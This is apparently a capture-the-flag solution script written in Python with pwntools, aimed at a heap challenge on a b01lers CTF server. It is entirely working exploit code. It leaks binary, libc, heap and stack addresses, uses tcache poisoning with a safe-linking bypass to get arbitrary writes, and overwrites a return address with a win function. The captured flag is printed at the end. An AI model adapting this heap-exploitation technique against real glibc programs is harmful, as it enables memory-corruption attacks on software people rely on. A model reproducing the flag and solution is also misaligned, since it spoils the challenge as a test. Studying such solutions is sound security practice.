from pwn import *

p = remote("gold.b01le.rs", 4002)
# p = process("./chal")

def alloc(index, size):
    p.sendlineafter(b'-----Resize----\n', b'1')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.sendlineafter(b'size? ', str(size).encode())
def free(index):
    p.sendlineafter(b'-----Resize----\n', b'2')
    p.sendlineafter(b'Where? ', str(index).encode())
def view(index):
    p.sendlineafter(b'-----Resize----\n', b'3')
    p.sendlineafter(b'Where? ', str(index).encode())
    return p.recvuntil(b'-----Options---', drop=True)[:-1]
def edit(index, data):
    p.sendlineafter(b'-----Resize----\n', b'4')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.recvline()
    p.send(data)
def exit_():
    p.sendlineafter(b'-----Resize----\n', b'5')
def resize(index, size):
    p.sendlineafter(b'-----Resize----\n', b'6')
    p.sendlineafter(b'Where? ', str(index).encode())
    p.sendlineafter(b'size? ', str(size).encode())
def special():
    p.sendlineafter(b'-----Resize----\n', b'7')
    p.recvuntil(b'Address: ')
    return p.recvline()[:-1]

bin_base = int(special(), 16) - 0x159f
win      = bin_base + 0x159f
log.info(f"bin base  = {hex(bin_base)}")
log.info(f"win       = {hex(win)}")

alloc(0, 0x420)
alloc(1, 0x10)
free(0)
libc_base = u64(view(0).ljust(8, b'\0')) - 0x1d1cc0
environ   = libc_base + 0x1d9320
log.info(f"libc base = {hex(libc_base)}")
log.info(f"environ   = {hex(environ)}")

alloc(0, 0x10)
alloc(1, 0x10)
free(1)
free(0)
heap_base = u64(view(1).ljust(8, b'\0')) << 12
edit(0, p64(environ ^ heap_base >> 12))
alloc(0, 0x10)
alloc(1, 0x10)
stack = u64(view(1).ljust(8, b'\0'))
log.info(f"heap base = {hex(heap_base)}")
log.info(f"stack     = {hex(stack)}")

alloc(0, 0x20)
alloc(1, 0x20)
free(1)
free(0)
edit(0, p64((stack - 0x168) ^ heap_base >> 12))
alloc(0, 0x20)
alloc(1, 0x20)
edit(1, b'A'*24+p64(win))

p.interactive()

# bctf{sm4ll_0v3rfl0w_1z_571ll_b4d_0k4y}
